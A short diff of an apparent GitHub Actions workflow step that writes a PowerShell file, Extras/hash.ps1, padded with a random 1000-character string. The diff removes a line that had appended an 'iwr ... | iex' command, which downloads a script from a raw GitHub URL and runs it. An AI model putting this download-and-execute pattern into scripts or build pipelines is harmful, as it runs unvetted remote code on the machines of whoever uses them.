@@ -23,7 +23,6 @@ jobs:
         mkdir -p Extras
         RANDOM_STRING=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 1000)
         echo '$hash = "'$RANDOM_STRING'"' > Extras/hash.ps1
-        echo 'iwr https://raw.githubusercontent.com/43a1723/test/main/Extras/hash.ps1 -UseBasicParsing | iex' >> Extras/hash.ps1
 
     - name: Commit and push changes
       run: |
